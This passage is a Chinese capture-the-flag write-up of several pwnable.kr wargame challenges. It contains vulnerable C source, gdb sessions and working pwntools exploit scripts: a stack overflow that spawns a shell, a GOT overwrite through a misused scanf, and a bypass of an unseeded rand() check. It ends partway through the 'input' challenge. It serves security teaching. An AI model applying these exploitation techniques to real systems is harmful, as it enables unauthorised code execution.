查看`bof.c`源代码，发现变量`overflowme`存在栈溢出漏洞，此外当`key`值等于`0xcafebabe`时会获得`shell`脚本。

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

我们使用`gdb`来进一步了解程序。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ gdb ./bof
pwndbg> disass main
Dump of assembler code for function main:
   0x0000068a <+0>:     push   ebp
   0x0000068b <+1>:     mov    ebp,esp
   0x0000068d <+3>:     and    esp,0xfffffff0
   0x00000690 <+6>:     sub    esp,0x10
   0x00000693 <+9>:     mov    DWORD PTR [esp],0xdeadbeef
   0x0000069a <+16>:    call   0x62c <func>
   0x0000069f <+21>:    mov    eax,0x0
   0x000006a4 <+26>:    leave  
   0x000006a5 <+27>:    ret    
End of assembler dump.
pwndbg> disass func
Dump of assembler code for function func:
   0x0000062c <+0>:     push   ebp
   0x0000062d <+1>:     mov    ebp,esp
   0x0000062f <+3>:     sub    esp,0x48
   0x00000632 <+6>:     mov    eax,gs:0x14
   0x00000638 <+12>:    mov    DWORD PTR [ebp-0xc],eax
   0x0000063b <+15>:    xor    eax,eax
   0x0000063d <+17>:    mov    DWORD PTR [esp],0x78c
   0x00000644 <+24>:    call   0x645 <func+25>  # printf
   0x00000649 <+29>:    lea    eax,[ebp-0x2c]   # overflowme的起始地址是$ebp-0x2c
   0x0000064c <+32>:    mov    DWORD PTR [esp],eax
   0x0000064f <+35>:    call   0x650 <func+36>  # gets
   0x00000654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe  # key的地址是$ebp+0x8
   0x0000065b <+47>:    jne    0x66b <func+63>
   0x0000065d <+49>:    mov    DWORD PTR [esp],0x79b
   0x00000664 <+56>:    call   0x665 <func+57>
   0x00000669 <+61>:    jmp    0x677 <func+75>
   0x0000066b <+63>:    mov    DWORD PTR [esp],0x7a3
   0x00000672 <+70>:    call   0x673 <func+71>
   0x00000677 <+75>:    mov    eax,DWORD PTR [ebp-0xc]
   0x0000067a <+78>:    xor    eax,DWORD PTR gs:0x14
   0x00000681 <+85>:    je     0x688 <func+92>
   0x00000683 <+87>:    call   0x684 <func+88>
   0x00000688 <+92>:    leave  
   0x00000689 <+93>:    ret    
End of assembler dump.
pwndbg> b gets  # break
Breakpoint 1 at 0x4c0
pwndbg> run
pwndbg> n  # 一直单步调试, 输入AAAAAAAA, 再已知单步运行直到推出gets函数回到func函数
0x56555654 in func ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────
 EAX  0xffffcf8c ◂— 'AAAAAAAA'
*EBX  0xf7e1cff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c
*ECX  0xf7e1e9c4 (_IO_stdfile_0_lock) ◂— 0x0
*EDX  0x1
*EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
*ESI  0x565556b0 (__libc_csu_init) ◂— push   ebp
*EBP  0xffffcfb8 —▸ 0xffffcfd8 ◂— 0x0
*ESP  0xffffcf70 —▸ 0xffffcf8c ◂— 'AAAAAAAA'
*EIP  0x56555654 (func+40) ◂— cmp    dword ptr [ebp + 8], 0xcafebabe
────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────
 ► 0x56555654 <func+40>    cmp    dword ptr [ebp + 8], 0xcafebabe
   0x5655565b <func+47>    jne    func+63                    <func+63>
    ↓
   0x5655566b <func+63>    mov    dword ptr [esp], 0x565557a3
   0x56555672 <func+70>    call   puts                    <puts>
 
   0x56555677 <func+75>    mov    eax, dword ptr [ebp - 0xc]
   0x5655567a <func+78>    xor    eax, dword ptr gs:[0x14]
   0x56555681 <func+85>    je     func+92                    <func+92>
 
   0x56555683 <func+87>    call   __stack_chk_fail                    <__stack_chk_fail>
 
   0x56555688 <func+92>    leave  
   0x56555689 <func+93>    ret    
 
   0x5655568a <main>       push   ebp
────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────
00:0000│ esp 0xffffcf70 —▸ 0xffffcf8c ◂— 'AAAAAAAA'
01:0004│     0xffffcf74 —▸ 0xf7fc9694 ◂— 0xe
02:0008│     0xffffcf78 —▸ 0xf7ffd608 (_rtld_global+1512) —▸ 0xf7fc9000 ◂— 0x464c457f
03:000c│     0xffffcf7c ◂— 0x0
04:0010│     0xffffcf80 —▸ 0xf7ffcff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x33f14
05:0014│     0xffffcf84 ◂— 0x2c /* ',' */
06:0018│     0xffffcf88 ◂— 0x0
07:001c│ eax 0xffffcf8c ◂— 'AAAAAAAA'
──────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────
 ► f 0 0x56555654 func+40
   f 1 0x5655569f main+21
   f 2 0xf7c23295 __libc_start_call_main+117
   f 3 0xf7c23358 __libc_start_main+136
   f 4 0x56555561 _start+49
──────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x $ebp+0x8   # 查看key
0xffffcfc0:     0xdeadbeef
pwndbg> x $ebp-0x2c  # 查看overflowme
0xffffcf8c:     0x41414141
pwndbg> x/1s $ebp-0x2c
0xffffcf8c:     "AAAAAAAA"
```

所以`padding`需要填充`0xffffcfc0-0xffffcf8c=52`个字节，然后输入`\xbe\xba\xfe\xca`覆盖掉变量`key`的值，从而获得`shell`。

编写`Python`代码求解，获得`shell`后输入`cat flag`得到`daddy, I just pwned a buFFer :)`。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('pwnable.kr', 9000)
payload = b'a'*52 + p32(0xcafebabe)
io.sendline(payload)
io.interactive()
```

------

### flag

这是**Pwnable.kr**的第四个挑战`flag`，来自**[Toddler's Bottle]**部分。

```bash
Papa brought me a packed present! let's open it.

Download : http://pwnable.kr/bin/flag

This is reversing task. all you need is binary
```

这题只给出一个二进制文件，让我们来看看。

```bash
$ wget http://pwnable.kr/bin/flag
$ sudo chmod +x ./flag
$ ./flag
I will malloc() and strcpy the flag there. take it.
$ file ./flag
./flag: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header
$ strings ./flag | grep packed
$Info: This file is packed with the UPX executable packer http://upx.sf.net $
```

可以看到`flag`是一个加密的二进制文件，现在用`UPX`进行解密。

```bash
$ upx -d ./flag     
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
    883745 <-    335288   37.94%   linux/amd64   flag

Unpacked 1 file.
```

解密后先`file ./flag  `查看文件类型，再`checksec --file=./flag  `检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ file ./flag
./flag: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=96ec4cc272aeb383bd9ed26c0d4ac0eb5db41b16, not stripped
                                                                                                  
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ checksec --file=./flag
[*] '/home/tyd/ctf/pwn/pwnable.kr/flag'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

使用`IDA pro 64bit`打开`flag`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char *v4; // [rsp+8h] [rbp-8h]

  puts(4810328LL, argv, envp);
  v4 = (char *)malloc(100LL);
  strcpy(v4, (const char *)flag);
  return 0;
}
```

按下`Shift+F12`查看`Strings window`可以看到`UPX...? sounds like a delivery service :)`，没错这就是`flag`。如果不信的话可以用`gdb`来获取`flag`。

```bash
$ gdb ./flag
pwndbg> disass main
Dump of assembler code for function main:
   0x0000000000401164 <+0>:     push   rbp
   0x0000000000401165 <+1>:     mov    rbp,rsp
   0x0000000000401168 <+4>:     sub    rsp,0x10
   0x000000000040116c <+8>:     mov    edi,0x496658
   0x0000000000401171 <+13>:    call   0x402080 <puts>
   0x0000000000401176 <+18>:    mov    edi,0x64
   0x000000000040117b <+23>:    call   0x4099d0 <malloc>
   0x0000000000401180 <+28>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401184 <+32>:    mov    rdx,QWORD PTR [rip+0x2c0ee5]        # 0x6c2070 <flag>
   0x000000000040118b <+39>:    mov    rax,QWORD PTR [rbp-0x8]
   0x000000000040118f <+43>:    mov    rsi,rdx
   0x0000000000401192 <+46>:    mov    rdi,rax
   0x0000000000401195 <+49>:    call   0x400320
   0x000000000040119a <+54>:    mov    eax,0x0
   0x000000000040119f <+59>:    leave  
   0x00000000004011a0 <+60>:    ret    
End of assembler dump.
pwndbg> x/1s *0x6c2070  # 根据程序的注释查看flag的内容
0x496628:       "UPX...? sounds like a delivery service :)"
```

------

### passcode

这是**Pwnable.kr**的第五个挑战`passcode`，来自**[Toddler's Bottle]**部分。

```bash
Mommy told me to make a passcode based login system.
My initial C code was compiled without any error!
Well, there was some compiler warning, but who cares about that?

ssh passcode@pwnable.kr -p2222 (pw:guest)
```

首先通过`ssh`远程连接目标主机。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ ssh passcode@pwnable.kr -p2222
passcode@pwnable.kr's password: 
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87@khu.ac.kr
- irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
You have mail.
Last login: Thu Jun  8 05:29:42 2023 from 5.29.16.52
```

然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。

```bash
passcode@pwnable:~$ ls -la
total 44
drwxr-x---   5 root passcode     4096 Jul  2  2022 .
drwxr-xr-x 117 root root         4096 Nov 10  2022 ..
d---------   2 root root         4096 Jun 26  2014 .bash_history
-r--r-----   1 root passcode_pwn   48 Jun 26  2014 flag
dr-xr-xr-x   2 root root         4096 Aug 20  2014 .irssi
-rw-------   1 root root         1287 Jul  2  2022 .mysql_history
-r-xr-sr-x   1 root passcode_pwn 7485 Jun 26  2014 passcode
-rw-r--r--   1 root root          858 Jun 26  2014 passcode.c
drwxr-xr-x   2 root root         4096 Oct 23  2016 .pwntools-cache
-rw-------   1 root root          581 Jul  2  2022 .viminfo
```

我们可以看到三个文件`passcode`、`passcode.c`和`flag`，其中`passcode`是`ELF`二进制可执行文件，`passcode.c`是编译二进制文件的`C`代码，用户`passcode`没有权限直接查看`flag`文件中的内容，所以我们老老实实地输入`cat passcode.c`来查看`passcode.c`的代码。

```bash
passcode@pwnable:~$ cat passcode.c
#include <stdio.h>
#include <stdlib.h>

void login(){
    int passcode1;
    int passcode2;

    printf("enter passcode1 : ");
    scanf("%d", passcode1);
    fflush(stdin);

    // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
    printf("enter passcode2 : ");
    scanf("%d", passcode2);

    printf("checking...\n");
    if(passcode1==338150 && passcode2==13371337){
            printf("Login OK!\n");
            system("/bin/cat flag");
    }
    else{
            printf("Login Failed!\n");
            exit(0);
    }
}

void welcome(){
    char name[100];
    printf("enter you name : ");
    scanf("%100s", name);
    printf("Welcome %s!\n", name);
}

int main(){
    printf("Toddler's Secure Login System 1.0 beta.\n");

    welcome();
    login();

    // something after login...
    printf("Now I can safely trust you that you have credential :)\n");
    return 0;
}
```

首先来看`welcome()`函数，声明了一个大小为`100`的变量`name`，用来读取用户输入的姓名。接着来看`login()`函数，需要用户输入俩个密码，并根据硬编码值`338150`和`13371337`来进行核对，如果输入正确就能读取文件`flag`中的内容。这题不是白给吗？

```bash
passcode@pwnable:~$ ./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : t0ur1st
Welcome t0ur1st!
enter passcode1 : 338150
Segmentation fault (core dumped)
```

没那么简单~~就能找到聊得来的伴~~ ~ 为什么会遇到段错误？因为`scanf`语句写错啦，它并没有用`&`提供`passcode1`和`passcode2`的地址，而是直接传递值。重新回顾到`welcome()`函数，这才发现该函数中的`scanf`语句同样写错啦。怎样利用该语句的漏洞来获取`flag`呢？用`gdb`来进一步了解该程序。

```bash
passcode@pwnable:~$ gdb ./passcode
(gdb) disass welcome
Dump of assembler code for function welcome:
   0x08048609 <+0>:     push   %ebp
   0x0804860a <+1>:     mov    %esp,%ebp
   0x0804860c <+3>:     sub    $0x88,%esp
   0x08048612 <+9>:     mov    %gs:0x14,%eax
   0x08048618 <+15>:    mov    %eax,-0xc(%ebp)
   0x0804861b <+18>:    xor    %eax,%eax
   0x0804861d <+20>:    mov    $0x80487cb,%eax
   0x08048622 <+25>:    mov    %eax,(%esp)
   0x08048625 <+28>:    call   0x8048420 <printf@plt>
   0x0804862a <+33>:    mov    $0x80487dd,%eax
   0x0804862f <+38>:    lea    -0x70(%ebp),%edx   # 注意到edx(处理I/O的数据寄存器)的值移动到了$ebp-0x70
   0x08048632 <+41>:    mov    %edx,0x4(%esp)
   0x08048636 <+45>:    mov    %eax,(%esp)
   0x08048639 <+48>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x0804863e <+53>:    mov    $0x80487e3,%eax
   0x08048643 <+58>:    lea    -0x70(%ebp),%edx  # 注意到edx(处理I/O的数据寄存器)的值移动到了$ebp-0x70
   0x08048646 <+61>:    mov    %edx,0x4(%esp)
   0x0804864a <+65>:    mov    %eax,(%esp)
   0x0804864d <+68>:    call   0x8048420 <printf@plt>
   0x08048652 <+73>:    mov    -0xc(%ebp),%eax
   0x08048655 <+76>:    xor    %gs:0x14,%eax
   0x0804865c <+83>:    je     0x8048663 <welcome+90>
   0x0804865e <+85>:    call   0x8048440 <__stack_chk_fail@plt>
   0x08048663 <+90>:    leave  
   0x08048664 <+91>:    ret    
End of assembler dump.
(gdb) b *0x8048643
Breakpoint 1 at 0x8048643
(gdb) run
Starting program: /home/passcode/passcode 
Toddler's Secure Login System 1.0 beta.
enter you name : t0ur1st

Breakpoint 1, 0x08048643 in welcome ()
(gdb) x/1s $ebp-0x70      # 果然这就是name
0xffdc91c8:     "t0ur1st"
```

知道了`name`的起始地址后，继续来看`login()`函数。

```assembly
(gdb) disass login
Dump of assembler code for function login:
   0x08048564 <+0>:     push   %ebp
   0x08048565 <+1>:     mov    %esp,%ebp
   0x08048567 <+3>:     sub    $0x28,%esp
   0x0804856a <+6>:     mov    $0x8048770,%eax
   0x0804856f <+11>:    mov    %eax,(%esp)
   0x08048572 <+14>:    call   0x8048420 <printf@plt>
   0x08048577 <+19>:    mov    $0x8048783,%eax
   0x0804857c <+24>:    mov    -0x10(%ebp),%edx
   0x0804857f <+27>:    mov    %edx,0x4(%esp)
   0x08048583 <+31>:    mov    %eax,(%esp)
   0x08048586 <+34>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x0804858b <+39>:    mov    0x804a02c,%eax
   0x08048590 <+44>:    mov    %eax,(%esp)
   0x08048593 <+47>:    call   0x8048430 <fflush@plt>
   0x08048598 <+52>:    mov    $0x8048786,%eax
   0x0804859d <+57>:    mov    %eax,(%esp)
   0x080485a0 <+60>:    call   0x8048420 <printf@plt>
   0x080485a5 <+65>:    mov    $0x8048783,%eax
   0x080485aa <+70>:    mov    -0xc(%ebp),%edx
   0x080485ad <+73>:    mov    %edx,0x4(%esp)
   0x080485b1 <+77>:    mov    %eax,(%esp)
   0x080485b4 <+80>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x080485b9 <+85>:    movl   $0x8048799,(%esp)
   0x080485c0 <+92>:    call   0x8048450 <puts@plt>
   0x080485c5 <+97>:    cmpl   $0x528e6,-0x10(%ebp)
   0x080485cc <+104>:   jne    0x80485f1 <login+141>
---Type <return> to continue, or q <return> to quit---
   0x080485ce <+106>:   cmpl   $0xcc07c9,-0xc(%ebp)
   0x080485d5 <+113>:   jne    0x80485f1 <login+141>
   0x080485d7 <+115>:   movl   $0x80487a5,(%esp)
   0x080485de <+122>:   call   0x8048450 <puts@plt>
   0x080485e3 <+127>:   movl   $0x80487af,(%esp)
   0x080485ea <+134>:   call   0x8048460 <system@plt>
   0x080485ef <+139>:   leave  
   0x080485f0 <+140>:   ret    
   0x080485f1 <+141>:   movl   $0x80487bd,(%esp)
   0x080485f8 <+148>:   call   0x8048450 <puts@plt>
   0x080485fd <+153>:   movl   $0x0,(%esp)
   0x08048604 <+160>:   call   0x8048480 <exit@plt>
End of assembler dump.
```

注意到有几行汇编代码从处理输入输出的`$edx`数据寄存器中赋值到了内存中的`scanf`，这里的汇编指令用的是`mov`而非`lea`。

```assembly
0x0804857c <+24>:    mov    -0x10(%ebp),%edx
...
0x080485aa <+70>:    mov    -0xc(%ebp),%edx
```

此处的`$ebp-0x10`更可能存放`passcode1`的内容，`$ebp-0xc`更可能存放`passcode2`的内容。

注意到输入完`passcode1`后执行了`fflush(stdin);`，反汇编`fflush`函数可以从`jmp *0x804a004`中得到它的起始地址`0x804a004`。

```assembly
(gdb) disass fflush
Dump of assembler code for function fflush@plt:
   0x08048430 <+0>:     jmp    *0x804a004
   0x08048436 <+6>:     push   $0x8
   0x0804843b <+11>:    jmp    0x8048410
End of assembler dump.
```

因为编译器会（错误地）将`passcode1`的值解释为地址，所以我们想要覆盖`passcode1`的值，我们的输入将被写入该值作为地址。所以我们需要填充`padding`到达缓冲区的末尾，然后设置`fflush`的起始地址`0x804a004`来劫持程序去执行`system("/bin/cat flag");`。此外，调用`system("/bin/cat flag");`这条语句对应的地址应该是`   0x080485e3 <+127>:   movl   $0x80487af,(%esp)`而不是
`0x080485ea <+134>:   call   0x8048460 <system@plt>`。

编写`Python`代码进行求解，需要注意的是最后提交的`flag`应该是`Sorry mom.. I got confused about scanf usage :(`，而不是`Now I can safely trust you that you have credential :)`。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
shell = ssh(user='passcode', host='pwnable.kr', port=2222, password='guest')
io = shell.process('./passcode')
io.recvuntil("enter you name : ")
payload = b'a'*96 + p32(0x804a004)
io.sendline(payload)
io.recvuntil("enter passcode1 : ")
io.sendline(b'134514147')  # str(0x80485e3).encode()
flag = io.recv()
log.success(flag)
# Sorry mom.. I got confused about scanf usage :(
# Now I can safely trust you that you have credential :)
io.close()
shell.close()
```

------

### random

这是**Pwnable.kr**的第六个挑战`random`，来自**[Toddler's Bottle]**部分。

```bash
Daddy, teach me how to use random value in programming!

ssh random@pwnable.kr -p2222 (pw:guest)
```

首先通过`ssh`远程连接目标主机。

```bash
┌──(tyd㉿kali-linux)-[~]
└─$ ssh random@pwnable.kr -p2222
random@pwnable.kr's password: 
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87@khu.ac.kr
- irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
You have mail.
Last login: Thu Jun  8 20:12:02 2023 from 80.145.91.187
```

然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。

```bash
random@pwnable:~$ ls -la
total 40
drwxr-x---   5 root       random 4096 Oct 23  2016 .
drwxr-xr-x 117 root       root   4096 Nov 10  2022 ..
d---------   2 root       root   4096 Jun 30  2014 .bash_history
-r--r-----   1 random_pwn root     49 Jun 30  2014 flag
dr-xr-xr-x   2 root       root   4096 Aug 20  2014 .irssi
drwxr-xr-x   2 root       root   4096 Oct 23  2016 .pwntools-cache
-r-sr-x---   1 random_pwn random 8538 Jun 30  2014 random
-rw-r--r--   1 root       root    301 Jun 30  2014 random.c
```

我们可以看到三个文件`random`、`random.c`和`flag`，其中`random`是`ELF`二进制可执行文件，`random.c`是编译二进制文件的`C`代码，用户`random`没有权限直接查看`flag`文件中的内容，所以我们老老实实地输入`cat random.c`来查看`random.c`的代码。

```bash
random@pwnable:~$ cat random.c
#include <stdio.h>

int main(){
    unsigned int random;
    random = rand();        // random value!

    unsigned int key=0;
    scanf("%d", &key);

    if( (key ^ random) == 0xdeadbeef ){
        printf("Good!\n");
        system("/bin/cat flag");
        return 0;
    }

    printf("Wrong, maybe you should try 2^32 cases.\n");
    return 0;
}
```

`C`语言的`rand()`是一种伪随机数，只要种子是确定的，生成的随机数列就是固定的。在上述代码中没有设置种子，所以不管执行多少次该程序，都会生成同样的数。因此，我们可以直接用`gdb`来查看变量`random`的数值。

```assembly
random@pwnable:~$ gdb ./random
(gdb) disass main
Dump of assembler code for function main:
   0x00000000004005f4 <+0>:     push   %rbp
   0x00000000004005f5 <+1>:     mov    %rsp,%rbp
   0x00000000004005f8 <+4>:     sub    $0x10,%rsp
   0x00000000004005fc <+8>:     mov    $0x0,%eax
   0x0000000000400601 <+13>:    callq  0x400500 <rand@plt>
   0x0000000000400606 <+18>:    mov    %eax,-0x4(%rbp)
   0x0000000000400609 <+21>:    movl   $0x0,-0x8(%rbp)
   0x0000000000400610 <+28>:    mov    $0x400760,%eax
   0x0000000000400615 <+33>:    lea    -0x8(%rbp),%rdx
   0x0000000000400619 <+37>:    mov    %rdx,%rsi
   0x000000000040061c <+40>:    mov    %rax,%rdi
   0x000000000040061f <+43>:    mov    $0x0,%eax
   0x0000000000400624 <+48>:    callq  0x4004f0 <__isoc99_scanf@plt>
   0x0000000000400629 <+53>:    mov    -0x8(%rbp),%eax
   0x000000000040062c <+56>:    xor    -0x4(%rbp),%eax
   0x000000000040062f <+59>:    cmp    $0xdeadbeef,%eax
   0x0000000000400634 <+64>:    jne    0x400656 <main+98>
   0x0000000000400636 <+66>:    mov    $0x400763,%edi
   0x000000000040063b <+71>:    callq  0x4004c0 <puts@plt>
   0x0000000000400640 <+76>:    mov    $0x400769,%edi
   0x0000000000400645 <+81>:    mov    $0x0,%eax
   0x000000000040064a <+86>:    callq  0x4004d0 <system@plt>
   0x000000000040064f <+91>:    mov    $0x0,%eax
   0x0000000000400654 <+96>:    jmp    0x400665 <main+113>
   0x0000000000400656 <+98>:    mov    $0x400778,%edi
   0x000000000040065b <+103>:   callq  0x4004c0 <puts@plt>
   0x0000000000400660 <+108>:   mov    $0x0,%eax
   0x0000000000400665 <+113>:   leaveq 
   0x0000000000400666 <+114>:   retq   
End of assembler dump.
```

其中这部分代码是调用`rand()`函数生成一个随机数，并将结果存储在局部变量`$ebp-0x4`中。

```assembly
0x00000000004005fc <+8>:     mov    $0x0,%eax
0x0000000000400601 <+13>:    callq  0x400500 <rand@plt>
0x0000000000400606 <+18>:    mov    %eax,-0x4(%rbp)
```

在接下来的第`*main+21`行汇编代码中，程序会将局部变量 `$rbp-0x8` 设置为`0`，我们可以在这行打断点来查看`$eax`寄存器中的数值。

```bash
(gdb) b *main+21
Breakpoint 1 at 0x400609
(gdb) run
Starting program: /home/random/random 

Breakpoint 1, 0x0000000000400609 in main ()
(gdb) info registers $eax
eax            0x6b8b4567       1804289383
```

所以变量`random`的数值是`0x6b8b4567`，接着只需要求出`(key ^ random) == 0xdeadbeef `中的`key`即可。编写`Python`代码求解，算出`key`的十进制数值是`3039230856`，提交`flag`：`Mommy, I thought libc random is unpredictable...`。

```python
from pwn import *

shell = ssh(user='random', host='pwnable.kr', port=2222, password='guest')
io = shell.process('./random')
key = 0x6b8b4567 ^ 0xdeadbeef
payload = str(key).encode()  # 3039230856
io.sendline(payload)
msg = io.recvline()  # Good!
flag = io.recv()  
log.success(flag)  # Mommy, I thought libc random is unpredictable...
io.close()
shell.close()
```

------

### input

这是**Pwnable.kr**的第七个挑战`input`，来自**[Toddler's Bottle]**部分。

```bash
Mom? how can I pass my input to a computer program?

ssh input2@pwnable.kr -p2222 (pw:guest)
```

首先通过`ssh`远程连接目标主机。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ ssh input2@pwnable.kr -p2222
input2@pwnable.kr's password: 
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87@khu.ac.kr
- irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
You have mail.
Last login: Thu Jun  8 18:35:49 2023 from 35.146.21.146
```

然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。

```bash
input2@pwnable:~$ ls -la
total 44
drwxr-x---   5 root       input2  4096 Oct 23  2016 .
drwxr-xr-x 117 root       root    4096 Nov 10  2022 ..
d---------   2 root       root    4096 Jun 30  2014 .bash_history
-r--r-----   1 input2_pwn root      55 Jun 30  2014 flag
-r-sr-x---   1 input2_pwn input2 13250 Jun 30  2014 input
-rw-r--r--   1 root       root    1754 Jun 30  2014 input.c
dr-xr-xr-x   2 root       root    4096 Aug 20  2014 .irssi
drwxr-xr-x   2 root       root    4096 Oct 23  2016 .pwntools-cache
```

我们可以看到三个文件`input`、`input.c`和`flag`，其中`input`是`ELF`二进制可执行文件，`input.c`是编译二进制文件的`C`代码，用户`input2`没有权限直接查看`flag`文件中的内容，所以我们老老实实地输入`cat input.c`来查看`input.c`的代码。

```c
input2@pwnable:~$ cat input.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(int argc, char* argv[], char* envp[]){
    printf("Welcome to pwnable.kr\n");
    printf("Let's see if you know how to give input to program\n");
    printf("Just give me correct inputs then you will get the flag :)\n");

    // argv
    if(argc != 100) return 0;
    if(strcmp(argv['A'],"\x00")) return 0;
    if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;
    printf("Stage 1 clear!\n");

    // stdio
    char buf[4];
    read(0, buf, 4);
    if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
    read(2, buf, 4);
    if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
    printf("Stage 2 clear!\n");

    // env
    if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;
    printf("Stage 3 clear!\n");

    // file
    FILE* fp = fopen("\x0a", "r");
    if(!fp) return 0;
    if( fread(buf, 4, 1, fp)!=1 ) return 0;
    if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
    fclose(fp);
    printf("Stage 4 clear!\n");

    // network
    int sd, cd;
    struct sockaddr_in saddr, caddr;
    sd = socket(AF_INET, SOCK_STREAM, 0);
    if(sd == -1){
        printf("socket error, tell admin\n");
        return 0;
    }
    saddr.sin_family = AF_INET;
    saddr.sin_addr.s_addr = INADDR_ANY;
    saddr.sin_port = htons( atoi(argv['C']) );
    if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
        printf("bind error, use another port\n");
        return 1;
    }
    listen(sd, 1);
    int c = sizeof(struct sockaddr_in);
    cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);
    if(cd < 0){
        printf("accept error, tell admin\n");
        return 0;
    }
    if( recv(cd, buf, 4, 0) != 4 ) return 0;
    if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
    printf("Stage 5 clear!\n");

    // here's your flag
    system("/bin/cat flag");
    return 0;
}
```

这题的文件有点长，我们拆开来分析。先来看 `argv` 这部分代码。

```c
if(argc != 100) return 0;
if(strcmp(argv['A'],"\x00")) return 0;
if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;
printf("Stage 1 clear!\n");
```

程序要求输入`100`个参数，且第`'A'`个参数值为`\x00`，第`'B'`个参数值为`\x20\x0a\x0d`。在ASCII表中，字符`'A'`和`'B'`对应的ASCII码分别`65`和`66`。也就是说第`65`个参数值为`\x00`，第`66`个参数值为`\x20\x0a\x0d`。编写`Python`代码来求解`stage 1`。

```python
args = ['A']*100
args[ord('A')] = '\x00'
args[ord('B')] = '\x20\x0a\x0d'
```

接着来看 `stdio` 这部分代码。

```c
char buf[4];
read(0, buf, 4);
